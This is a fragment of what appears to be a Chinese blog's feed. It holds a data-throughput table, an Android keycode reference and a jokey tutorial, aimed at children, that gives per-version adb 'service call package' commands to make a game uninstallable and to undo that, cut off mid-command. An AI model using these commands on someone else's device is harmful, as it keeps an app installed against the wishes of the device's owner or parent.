        <content type="html"><![CDATA[<p>无限流量卡能用多少流量？  </p><a id="more"></a><table><thead><tr><th align="center">速度</th><th align="center">最大使用流量</th></tr></thead><tbody><tr><td align="center">限速4Gbps</td><td align="center">512M/秒→30G/分→1.75T/小时→42.18T/天</td></tr><tr><td align="center">限速2Gbps</td><td align="center">256M/秒→15G/分→900G/小时→21.09T/天</td></tr><tr><td align="center">限速1Gbps</td><td align="center">128M/秒→7.5G/分→450G/小时→10.54T/天</td></tr><tr><td align="center">限速500Mbps</td><td align="center">62.5M/秒→3.66G/分→219.72G/小→5.14T/天</td></tr><tr><td align="center">限速300Mbps</td><td align="center">37.5M/秒→2.19G/分→131.83G/小时→3.08T/天</td></tr><tr><td align="center">限速100Mbps</td><td align="center">12.5M/秒→750M/分→43.94G/小时→1.02T/天</td></tr><tr><td align="center">限速7.2Mbps</td><td align="center">921.6K/秒→54M/分→3.16G/小时→75.93G/天</td></tr><tr><td align="center">限速3.1Mbps</td><td align="center">396.8K/秒→23.25M/分→1.36G/小时→32.69G/天</td></tr><tr><td align="center">限速3Mbps</td><td align="center">384K/秒→22.5M/分→1.31G/小时→31.64G/天</td></tr><tr><td align="center">限速1Mbps</td><td align="center">128K/秒→7.5M/分→450M/小时→10.54G/天</td></tr><tr><td align="center">限速512Kbps</td><td align="center">64K/秒→3.75M/分→225M/小时→5.27G/天</td></tr><tr><td align="center">限速256Kbps</td><td align="center">32K/秒→1.87M/分→112.5M/小时→2.63G/天</td></tr><tr><td align="center">限速128Kbps</td><td align="center">16K/秒→0.93M/分→56.25/小时→1.31G/天</td></tr></tbody></table><p><a href="http://www.coolapk.com/u/431730" target="_blank" rel="noopener">知行合一</a>制作 </p><p><a href="https://www.coolapk.com/feed/43732960?shareKey=NjYxYjRiZjFlODM0NjNmZTdhZjA~&shareUid=778415&shareFrom=com.coolapk.market_12.5.4" target="_blank" rel="noopener">酷安帖子</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安卓键值</title>
      <link href="/2023/an-zhuo-jian-zhi/"/>
      <url>/2023/an-zhuo-jian-zhi/</url>
      
        <content type="html"><![CDATA[<p>android menu 键值,Android KeyCode安卓手机按键对应键码键值  </p><p>搜集了最全的Android 安卓手机按键对应键码键值，供ADB模拟按键对模拟器的操作。  </p><a id="more"></a><h4 id="电话键"><a href="#电话键" class="headerlink" title="电话键"></a>电话键</h4><table><thead><tr><th align="center">键名</th><th align="center">描述</th><th align="center">键值</th></tr></thead><tbody><tr><td align="center">KEYCODE_CALL</td><td align="center">拨号键</td><td align="center">5</td></tr><tr><td align="center">KEYCODE_ENDCALL</td><td align="center">挂机键</td><td align="center">6</td></tr><tr><td align="center">KEYCODE_HOME</td><td align="center">按键Home</td><td align="center">3</td></tr><tr><td align="center">KEYCODE_MENU</td><td align="center">菜单键</td><td align="center">82</td></tr><tr><td align="center">KEYCODE_BACK</td><td align="center">返回键</td><td align="center">4</td></tr><tr><td align="center">KEYCODE_SEARCH</td><td align="center">搜索键</td><td align="center">84</td></tr><tr><td align="center">KEYCODE_CAMERA</td><td align="center">拍照键</td><td align="center">27</td></tr><tr><td align="center">KEYCODE_FOCUS</td><td align="center">拍照对焦键</td><td align="center">80</td></tr><tr><td align="center">KEYCODE_POWER</td><td align="center">电源键</td><td align="center">26</td></tr><tr><td align="center">KEYCODE_NOTIFICATION</td><td align="center">通知键</td><td align="center">83</td></tr><tr><td align="center">KEYCODE_MUTE</td><td align="center">话筒静音键</td><td align="center">91</td></tr><tr><td align="center">KEYCODE_VOLUME_MUTE</td><td align="center">扬声器静音键</td><td align="center">164</td></tr><tr><td align="center">KEYCODE_VOLUME_UP</td><td align="center">音量增加键</td><td align="center">24</td></tr><tr><td align="center">KEYCODE_VOLUME_DOWN</td><td align="center">音量减小键</td><td align="center">25</td></tr></tbody></table><h4 id="控制键"><a href="#控制键" class="headerlink" title="控制键"></a>控制键</h4><table><thead><tr><th align="center">键名</th><th align="center">描述</th><th align="center">键值</th></tr></thead><tbody><tr><td align="center">KEYCODE_ENTER</td><td align="center">回车键</td><td align="center">66</td></tr><tr><td align="center">KEYCODE_ESCAPE</td><td align="center">ESC键</td><td align="center">111</td></tr><tr><td align="center">KEYCODE_DPAD_CENTER</td><td align="center">导航键确定键</td><td align="center">23</td></tr><tr><td align="center">KEYCODE_DPAD_UP</td><td align="center">导航键向上</td><td align="center">19</td></tr><tr><td align="center">KEYCODE_DPAD_DOWN</td><td align="center">导航键向下</td><td align="center">20</td></tr><tr><td align="center">KEYCODE_DPAD_LEFT</td><td align="center">导航键向左</td><td align="center">21</td></tr><tr><td align="center">KEYCODE_DPAD_RIGHT</td><td align="center">导航键向右</td><td align="center">22</td></tr><tr><td align="center">KEYCODE_MOVE_HOME</td><td align="center">光标移动到开始键</td><td align="center">122</td></tr><tr><td align="center">KEYCODE_MOVE_END</td><td align="center">光标移动到末尾键</td><td align="center">123</td></tr><tr><td align="center">KEYCODE_PAGE_UP</td><td align="center">向上翻页键</td><td align="center">92</td></tr><tr><td align="center">KEYCODE_PAGE_DOWN</td><td align="center">向下翻页键</td><td align="center">93</td></tr><tr><td align="center">KEYCODE_DEL</td><td align="center">退格键</td><td align="center">67</td></tr><tr><td align="center">KEYCODE_FORWARD_DEL</td><td align="center">删除键</td><td align="center">112</td></tr><tr><td align="center">KEYCODE_INSERT</td><td align="center">插入键</td><td align="center">124</td></tr><tr><td align="center">KEYCODE_TAB</td><td align="center">Tab键</td><td align="center">61</td></tr><tr><td align="center">KEYCODE_NUM_LOCK</td><td align="center">小键盘锁</td><td align="center">143</td></tr><tr><td align="center">KEYCODE_CAPS_LOCK</td><td align="center">大写锁定键</td><td align="center">115</td></tr><tr><td align="center">KEYCODE_BREAK</td><td align="center">Break/Pause键</td><td align="center">121</td></tr><tr><td align="center">KEYCODE_SCROLL_LOCK</td><td align="center">滚动锁定键</td><td align="center">116</td></tr><tr><td align="center">KEYCODE_ZOOM_IN</td><td align="center">放大键</td><td align="center">168</td></tr><tr><td align="center">KEYCODE_ZOOM_OUT</td><td align="center">缩小键</td><td align="center">169</td></tr></tbody></table><h4 id="组合键"><a href="#组合键" class="headerlink" title="组合键"></a>组合键</h4><table><thead><tr><th align="center">键名</th><th align="center">描述</th><th align="center">键值</th></tr></thead><tbody><tr><td align="center">KEYCODE_ALT_LEFT</td><td align="center">Alt+Left</td><td align="center"></td></tr><tr><td align="center">KEYCODE_ALT_RIGHT</td><td align="center">Alt+Right</td><td align="center"></td></tr><tr><td align="center">KEYCODE_CTRL_LEFT</td><td align="center">Control+Left</td><td align="center"></td></tr><tr><td align="center">KEYCODE_CTRL_RIGHT</td><td align="center">Control+Right</td><td align="center"></td></tr><tr><td align="center">KEYCODE_SHIFT_LEFT</td><td align="center">Shift+Left</td><td align="center"></td></tr><tr><td align="center">KEYCODE_SHIFT_RIGHT</td><td align="center">Shift+Right</td><td align="center"></td></tr></tbody></table><h4 id="基本键"><a href="#基本键" class="headerlink" title="基本键"></a>基本键</h4><table><thead><tr><th align="center">键名</th><th align="center">描述</th><th align="center">键值</th></tr></thead><tbody><tr><td align="center">KEYCODE_0</td><td align="center">按键’0’</td><td align="center">7</td></tr><tr><td align="center">KEYCODE_1</td><td align="center">按键’1’</td><td align="center">8</td></tr><tr><td align="center">KEYCODE_2</td><td align="center">按键’2’</td><td align="center">9</td></tr><tr><td align="center">KEYCODE_3</td><td align="center">按键’3’</td><td align="center">10</td></tr><tr><td align="center">KEYCODE_4</td><td align="center">按键’4’</td><td align="center">11</td></tr><tr><td align="center">KEYCODE_5</td><td align="center">按键’5’</td><td align="center">12</td></tr><tr><td align="center">KEYCODE_6</td><td align="center">按键’6’</td><td align="center">13</td></tr><tr><td align="center">KEYCODE_7</td><td align="center">按键’7’</td><td align="center">14</td></tr><tr><td align="center">KEYCODE_8</td><td align="center">按键’8’</td><td align="center">15</td></tr><tr><td align="center">KEYCODE_9</td><td align="center">按键’9’</td><td align="center">16</td></tr><tr><td align="center">KEYCODE_A</td><td align="center">按键’A’</td><td align="center">29</td></tr><tr><td align="center">KEYCODE_B</td><td align="center">按键’B’</td><td align="center">30</td></tr><tr><td align="center">KEYCODE_C</td><td align="center">按键’C’</td><td align="center">31</td></tr><tr><td align="center">KEYCODE_D</td><td align="center">按键’D’</td><td align="center">32</td></tr><tr><td align="center">KEYCODE_E</td><td align="center">按键’E’</td><td align="center">33</td></tr><tr><td align="center">KEYCODE_F</td><td align="center">按键’F’</td><td align="center">34</td></tr><tr><td align="center">KEYCODE_G</td><td align="center">按键’G’</td><td align="center">35</td></tr><tr><td align="center">KEYCODE_H</td><td align="center">按键’H’</td><td align="center">36</td></tr><tr><td align="center">KEYCODE_I</td><td align="center">按键’I’</td><td align="center">37</td></tr><tr><td align="center">KEYCODE_J</td><td align="center">按键’J’</td><td align="center">38</td></tr><tr><td align="center">KEYCODE_K</td><td align="center">按键’K’</td><td align="center">39</td></tr><tr><td align="center">KEYCODE_L</td><td align="center">按键’L’</td><td align="center">40</td></tr><tr><td align="center">KEYCODE_M</td><td align="center">按键’M’</td><td align="center">41</td></tr><tr><td align="center">KEYCODE_N</td><td align="center">按键’N’</td><td align="center">42</td></tr><tr><td align="center">KEYCODE_O</td><td align="center">按键’O’</td><td align="center">43</td></tr><tr><td align="center">KEYCODE_P</td><td align="center">按键’P’</td><td align="center">44</td></tr><tr><td align="center">KEYCODE_Q</td><td align="center">按键’Q’</td><td align="center">45</td></tr><tr><td align="center">KEYCODE_R</td><td align="center">按键’R’</td><td align="center">46</td></tr><tr><td align="center">KEYCODE_S</td><td align="center">按键’S’</td><td align="center">47</td></tr><tr><td align="center">KEYCODE_T</td><td align="center">按键’T’</td><td align="center">48</td></tr><tr><td align="center">KEYCODE_U</td><td align="center">按键’U’</td><td align="center">49</td></tr><tr><td align="center">KEYCODE_V</td><td align="center">按键’V’</td><td align="center">50</td></tr><tr><td align="center">KEYCODE_W</td><td align="center">按键’W’</td><td align="center">51</td></tr><tr><td align="center">KEYCODE_X</td><td align="center">按键’X’</td><td align="center">52</td></tr><tr><td align="center">KEYCODE_Y</td><td align="center">按键’Y’</td><td align="center">53</td></tr><tr><td align="center">KEYCODE_Z</td><td align="center">按键’Z’</td><td align="center">54</td></tr></tbody></table><h4 id="符合键"><a href="#符合键" class="headerlink" title="符合键"></a>符合键</h4><table><thead><tr><th align="center">键名</th><th align="center">描述</th><th align="center">键值</th></tr></thead><tbody><tr><td align="center">KEYCODE_PLUS</td><td align="center">按键’+’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_MINUS</td><td align="center">按键’-‘</td><td align="center"></td></tr><tr><td align="center">KEYCODE_STAR</td><td align="center">按键’*’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_SLASH</td><td align="center">按键’/‘</td><td align="center"></td></tr><tr><td align="center">KEYCODE_EQUALS</td><td align="center">按键’=’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_AT</td><td align="center">按键‘@’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_POUND</td><td align="center">按键’#’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_APOSTROPHE</td><td align="center">按键’’’(单引号)</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BACKSLASH</td><td align="center">按键’&#39;</td><td align="center"></td></tr><tr><td align="center">KEYCODE_COMMA</td><td align="center">按键’,’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_PERIOD</td><td align="center">按键’.’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_LEFT_BRACKET</td><td align="center">按键’[‘</td><td align="center"></td></tr><tr><td align="center">KEYCODE_RIGHT_BRACKET</td><td align="center">按键’]’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_SEMICOLON</td><td align="center">按键’;’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_GRAVE</td><td align="center">按键’`’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_SPACE</td><td align="center">空格键</td><td align="center"></td></tr></tbody></table><h4 id="小键盘键"><a href="#小键盘键" class="headerlink" title="小键盘键"></a>小键盘键</h4><table><thead><tr><th align="center">键名</th><th align="center">描述</th><th align="center">键值</th></tr></thead><tbody><tr><td align="center">KEYCODE_NUMPAD_0</td><td align="center">小键盘按键’0’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_NUMPAD_1</td><td align="center">小键盘按键’1’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_NUMPAD_2</td><td align="center">小键盘按键’2’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_NUMPAD_3</td><td align="center">小键盘按键’3’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_NUMPAD_4</td><td align="center">小键盘按键’4’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_NUMPAD_5</td><td align="center">小键盘按键’5’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_NUMPAD_6</td><td align="center">小键盘按键’6’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_NUMPAD_7</td><td align="center">小键盘按键’7’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_NUMPAD_8</td><td align="center">小键盘按键’8’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_NUMPAD_9</td><td align="center">小键盘按键’9’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_NUMPAD_ADD</td><td align="center">小键盘按键’+’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_NUMPAD_SUBTRACT</td><td align="center">小键盘按键’-‘</td><td align="center"></td></tr><tr><td align="center">KEYCODE_NUMPAD_MULTIPLY</td><td align="center">小键盘按键’*’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_NUMPAD_DIVIDE</td><td align="center">小键盘按键’/‘</td><td align="center"></td></tr><tr><td align="center">KEYCODE_NUMPAD_EQUALS</td><td align="center">小键盘按键’=’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_NUMPAD_COMMA</td><td align="center">小键盘按键’,’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_NUMPAD_DOT</td><td align="center">小键盘按键’.’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_NUMPAD_LEFT_PAREN</td><td align="center">小键盘按键’(‘</td><td align="center"></td></tr><tr><td align="center">KEYCODE_NUMPAD_RIGHT_PAREN</td><td align="center">小键盘按键’)’</td><td align="center"></td></tr><tr><td align="center">KEYCODE_NUMPAD_ENTER</td><td align="center">小键盘按键回车</td><td align="center"></td></tr></tbody></table><h4 id="功能键"><a href="#功能键" class="headerlink" title="功能键"></a>功能键</h4><table><thead><tr><th align="center">键名</th><th align="center">描述</th><th align="center">键值</th></tr></thead><tbody><tr><td align="center">KEYCODE_F1</td><td align="center">按键F1</td><td align="center"></td></tr><tr><td align="center">KEYCODE_F2</td><td align="center">按键F2</td><td align="center"></td></tr><tr><td align="center">KEYCODE_F3</td><td align="center">按键F3</td><td align="center"></td></tr><tr><td align="center">KEYCODE_F4</td><td align="center">按键F4</td><td align="center"></td></tr><tr><td align="center">KEYCODE_F5</td><td align="center">按键F5</td><td align="center"></td></tr><tr><td align="center">KEYCODE_F6</td><td align="center">按键F6</td><td align="center"></td></tr><tr><td align="center">KEYCODE_F7</td><td align="center">按键F7</td><td align="center"></td></tr><tr><td align="center">KEYCODE_F8</td><td align="center">按键F8</td><td align="center"></td></tr><tr><td align="center">KEYCODE_F9</td><td align="center">按键F9</td><td align="center"></td></tr><tr><td align="center">KEYCODE_F10</td><td align="center">按键F10</td><td align="center"></td></tr><tr><td align="center">KEYCODE_F11</td><td align="center">按键F11</td><td align="center"></td></tr><tr><td align="center">KEYCODE_F12</td><td align="center">按键F12</td><td align="center"></td></tr></tbody></table><h4 id="多媒体键"><a href="#多媒体键" class="headerlink" title="多媒体键"></a>多媒体键</h4><table><thead><tr><th align="center">键名</th><th align="center">描述</th><th align="center">键值</th></tr></thead><tbody><tr><td align="center">KEYCODE_MEDIA_PLAY</td><td align="center">多媒体键播放</td><td align="center"></td></tr><tr><td align="center">KEYCODE_MEDIA_STOP</td><td align="center">多媒体键停止</td><td align="center"></td></tr><tr><td align="center">KEYCODE_MEDIA_PAUSE</td><td align="center">多媒体键暂停</td><td align="center"></td></tr><tr><td align="center">KEYCODE_MEDIA_PLAY_PAUSE</td><td align="center">多媒体键播放/暂停</td><td align="center"></td></tr><tr><td align="center">KEYCODE_MEDIA_FAST_FORWARD</td><td align="center">多媒体键快进</td><td align="center"></td></tr><tr><td align="center">KEYCODE_MEDIA_REWIND</td><td align="center">多媒体键快退</td><td align="center"></td></tr><tr><td align="center">KEYCODE_MEDIA_NEXT</td><td align="center">多媒体键下一首</td><td align="center"></td></tr><tr><td align="center">KEYCODE_MEDIA_PREVIOUS</td><td align="center">多媒体键上一首</td><td align="center"></td></tr><tr><td align="center">KEYCODE_MEDIA_CLOSE</td><td align="center">多媒体键关闭</td><td align="center"></td></tr><tr><td align="center">KEYCODE_MEDIA_EJECT</td><td align="center">多媒体键弹出</td><td align="center"></td></tr><tr><td align="center">KEYCODE_MEDIA_RECORD</td><td align="center">多媒体键录音</td><td align="center"></td></tr></tbody></table><h4 id="手柄键"><a href="#手柄键" class="headerlink" title="手柄键"></a>手柄键</h4><table><thead><tr><th align="center">键名</th><th align="center">描述</th><th align="center">键值</th></tr></thead><tbody><tr><td align="center">KEYCODE_BUTTON_1</td><td align="center">通用游戏手柄按钮#1</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_2</td><td align="center">通用游戏手柄按钮#2</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_3</td><td align="center">通用游戏手柄按钮#3</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_4</td><td align="center">通用游戏手柄按钮#4</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_5</td><td align="center">通用游戏手柄按钮#5</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_6</td><td align="center">通用游戏手柄按钮#6</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_7</td><td align="center">通用游戏手柄按钮#7</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_8</td><td align="center">通用游戏手柄按钮#8</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_9</td><td align="center">通用游戏手柄按钮#9</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_10</td><td align="center">通用游戏手柄按钮#10</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_11</td><td align="center">通用游戏手柄按钮#11</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_12</td><td align="center">通用游戏手柄按钮#12</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_13</td><td align="center">通用游戏手柄按钮#13</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_14</td><td align="center">通用游戏手柄按钮#14</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_15</td><td align="center">通用游戏手柄按钮#15</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_16</td><td align="center">通用游戏手柄按钮#16</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_A</td><td align="center">游戏手柄按钮A</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_B</td><td align="center">游戏手柄按钮B</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_C</td><td align="center">游戏手柄按钮C</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_X</td><td align="center">游戏手柄按钮X</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_Y</td><td align="center">游戏手柄按钮Y</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_Z</td><td align="center">游戏手柄按钮Z</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_L1</td><td align="center">游戏手柄按钮L1</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_L2</td><td align="center">游戏手柄按钮L2</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_R1</td><td align="center">游戏手柄按钮R1</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_R2</td><td align="center">游戏手柄按钮R2</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_MODE</td><td align="center">游戏手柄按钮Mode</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_SELECT</td><td align="center">游戏手柄按钮Select</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_START</td><td align="center">游戏手柄按钮Start</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_THUMBL</td><td align="center">LeftThumbButton</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BUTTON_THUMBR</td><td align="center">RightThumbButton</td><td align="center"></td></tr></tbody></table><h4 id="待查验证"><a href="#待查验证" class="headerlink" title="待查验证"></a>待查验证</h4><table><thead><tr><th align="center">键名</th><th align="center">描述</th><th align="center">键值</th></tr></thead><tbody><tr><td align="center">KEYCODE_NUM</td><td align="center">按键Numbermodifier</td><td align="center"></td></tr><tr><td align="center">KEYCODE_INFO</td><td align="center">按键Info</td><td align="center"></td></tr><tr><td align="center">KEYCODE_APP_SWITCH</td><td align="center">按键Appswitch</td><td align="center"></td></tr><tr><td align="center">KEYCODE_BOOKMARK</td><td align="center">按键Bookmark</td><td align="center"></td></tr><tr><td align="center">KEYCODE_AVR_INPUT</td><td align="center">按键A/VReceiverinput</td><td align="center"></td></tr><tr><td align="center">KEYCODE_AVR_POWER</td><td align="center">按键A/VReceiverpower</td><td align="center"></td></tr><tr><td align="center">KEYCODE_CAPTIONS</td><td align="center">按键Togglecaptions</td><td align="center"></td></tr><tr><td align="center">KEYCODE_CHANNEL_DOWN</td><td align="center">按键Channeldown</td><td align="center"></td></tr><tr><td align="center">KEYCODE_CHANNEL_UP</td><td align="center">按键Channelup</td><td align="center"></td></tr><tr><td align="center">KEYCODE_CLEAR</td><td align="center">按键Clear</td><td align="center"></td></tr><tr><td align="center">KEYCODE_DVR</td><td align="center">按键DVR</td><td align="center"></td></tr><tr><td align="center">KEYCODE_ENVELOPE</td><td align="center">按键Envelopespecialfunction</td><td align="center"></td></tr><tr><td align="center">KEYCODE_EXPLORER</td><td align="center">按键Explorerspecialfunction</td><td align="center"></td></tr><tr><td align="center">KEYCODE_FORWARD</td><td align="center">按键Forward</td><td align="center"></td></tr><tr><td align="center">KEYCODE_FORWARD_DEL</td><td align="center">按键ForwardDelete</td><td align="center"></td></tr><tr><td align="center">KEYCODE_FUNCTION</td><td align="center">按键Functionmodifier</td><td align="center"></td></tr><tr><td align="center">KEYCODE_GUIDE</td><td align="center">按键Guide</td><td align="center"></td></tr><tr><td align="center">KEYCODE_HEADSETHOOK</td><td align="center">按键HeadsetHook</td><td align="center"></td></tr><tr><td align="center">KEYCODE_META_LEFT</td><td align="center">按键LeftMetamodifier</td><td align="center"></td></tr><tr><td align="center">KEYCODE_META_RIGHT</td><td align="center">按键RightMetamodifier</td><td align="center"></td></tr><tr><td align="center">KEYCODE_PICTSYMBOLS</td><td align="center">按键PictureSymbolsmodifier</td><td align="center"></td></tr><tr><td align="center">KEYCODE_PROG_BLUE</td><td align="center">按键Blue“programmable”</td><td align="center"></td></tr><tr><td align="center">KEYCODE_PROG_GREEN</td><td align="center">按键Green“programmable”</td><td align="center"></td></tr><tr><td align="center">KEYCODE_PROG_RED</td><td align="center">按键Red“programmable”</td><td align="center"></td></tr><tr><td align="center">KEYCODE_PROG_YELLOW</td><td align="center">按键Yellow“programmable”</td><td align="center"></td></tr><tr><td align="center">KEYCODE_SETTINGS</td><td align="center">按键Settings</td><td align="center"></td></tr><tr><td align="center">KEYCODE_SOFT_LEFT</td><td align="center">按键SoftLeft (左软键)</td><td align="center"></td></tr><tr><td align="center">KEYCODE_SOFT_RIGHT</td><td align="center">按键SoftRight (右软键)</td><td align="center"></td></tr><tr><td align="center">KEYCODE_STB_INPUT</td><td align="center">按键Set-top-boxinput</td><td align="center"></td></tr><tr><td align="center">KEYCODE_STB_POWER</td><td align="center">按键Set-top-boxpower</td><td align="center"></td></tr><tr><td align="center">KEYCODE_SWITCH_CHARSET</td><td align="center">按键SwitchCharsetmodifier</td><td align="center"></td></tr><tr><td align="center">KEYCODE_SYM</td><td align="center">按键Symbolmodifier</td><td align="center"></td></tr><tr><td align="center">KEYCODE_SYSRQ</td><td align="center">按键SystemRequest/PrintScreen</td><td align="center"></td></tr><tr><td align="center">KEYCODE_TV</td><td align="center">按键TV</td><td align="center"></td></tr><tr><td align="center">KEYCODE_TV_INPUT</td><td align="center">按键TVinput</td><td align="center"></td></tr><tr><td align="center">KEYCODE_TV_POWER</td><td align="center">按键TVpower</td><td align="center"></td></tr><tr><td align="center">KEYCODE_WINDOW</td><td align="center">按键Window</td><td align="center"></td></tr><tr><td align="center">KEYCODE_UNKNOWN</td><td align="center">未知按键</td><td align="center"></td></tr></tbody></table><blockquote><p>转载自 <a href="https://blog.csdn.net/weixin_31532363/article/details/117579249" target="_blank" rel="noopener">https://blog.csdn.net/weixin_31532363/article/details/117579249</a> 有修改调整</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>阻止应用卸载</title>
      <link href="/2023/zu-zhi-ying-yong-xie-zai/"/>
      <url>/2023/zu-zhi-ying-yong-xie-zai/</url>
      
        <content type="html"><![CDATA[<p>晨钟酱两年半之前教过大家如何使用adb权限禁止安装某个APP，想要考古请移步 <a href="https://www.coolapk.com/feed/21837207?shareKey=Nzg0Y2YxYTI0NjA3NjNlNDUzMmU~&shareUid=2638279&shareFrom=com.coolapk.market_12.5.2" target="_blank" rel="noopener">晨钟酱动态</a>   </p><a id="more"></a><p><img src="/img/preloader.gif" data-original="/coolapk-emotion/64_shounuehuaji.gif" alt="img"></p><p>但是我作为熊孩子小学生，自然不能乖乖就范<img src="/img/preloader.gif" data-original="/coolapk-emotion/15_fanu.gif" alt="img">于是，为了能够让自己的王者荣耀不被卸载，经过时长两年半的安卓代码练习，现在我要教广大小学生同胞们如何使用adb权限执行一行命令即可禁止卸载某个APP<img src="/img/preloader.gif" data-original="/coolapk-emotion/64_shounuehuaji.gif" alt="img"><img src="/img/preloader.gif" data-original="/coolapk-emotion/64_shounuehuaji.gif" alt="img">[受虐滑稽</p><p>注：文章中禁止卸载的APP为王者荣耀，对应的包名为com.tencent.tmgp.sgame。酷友们也可以改成其他APP的包名<img src="/img/preloader.gif" data-original="/coolapk-emotion/64_shounuehuaji.gif" alt="img">。</p><p>正文开始！</p><p>禁止卸载的命令根据安卓版本不同而稍有区别。（区别就是一个数字而已）</p><p>安卓7.1.2：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service call package <span class="number">145</span> s16 com.tencent.tmgp.sgame i32 <span class="number">1</span> i32 <span class="number">0</span></span><br></pre></td></tr></table></figure><p>安卓8.0：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service call package <span class="number">151</span> s16 com.tencent.tmgp.sgame i32 <span class="number">1</span> i32 <span class="number">0</span></span><br></pre></td></tr></table></figure><p>安卓8.1：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service call package <span class="number">152</span> s16 com.tencent.tmgp.sgame i32 <span class="number">1</span> i32 <span class="number">0</span></span><br></pre></td></tr></table></figure><p>安卓9：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service call package <span class="number">151</span> s16 com.tencent.tmgp.sgame i32 <span class="number">1</span> i32 <span class="number">0</span></span><br></pre></td></tr></table></figure><p>安卓10：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service call package <span class="number">156</span> s16 com.tencent.tmgp.sgame i32 <span class="number">1</span> i32 <span class="number">0</span></span><br></pre></td></tr></table></figure><p>安卓11：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service call package <span class="number">136</span> s16 com.tencent.tmgp.sgame i32 <span class="number">1</span> i32 <span class="number">0</span></span><br></pre></td></tr></table></figure><p>安卓12：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service call package <span class="number">136</span> s16 com.tencent.tmgp.sgame i32 <span class="number">1</span> i32 <span class="number">0</span></span><br></pre></td></tr></table></figure><p>安卓13：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service call package <span class="number">133</span> s16 com.tencent.tmgp.sgame i32 <span class="number">1</span> i32 <span class="number">0</span></span><br></pre></td></tr></table></figure><p>教学结束，小学生牛B！<img src="/img/preloader.gif" data-original="/coolapk-emotion/64_shounuehuaji.gif" alt="img"></p><hr><p>要想恢复成可以卸载的状态，只需要把上面禁止卸载的命令末尾的i32 1 i32 0替换成i32 0 i32 0然后再执行即可。举例，安卓12恢复王者荣耀为可卸载状态的命令为：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service call package <span class="number">136</span> s16 com.tencent.tmgp.sgame i32 <span class="number">0</span> i32 <span class="number">0</span></span><br></pre></td></tr></table></figure><hr><p>想要查询某个APP是否已被设定为禁止卸载，只需要将禁止卸载的命令中的数字+1，然后去掉i32 1，最后执行即可。举例，安卓12查看王者荣耀是否已经被禁止卸载的命令为：<br>service call package 137 s16 com.tencent.tmgp.sgame i32 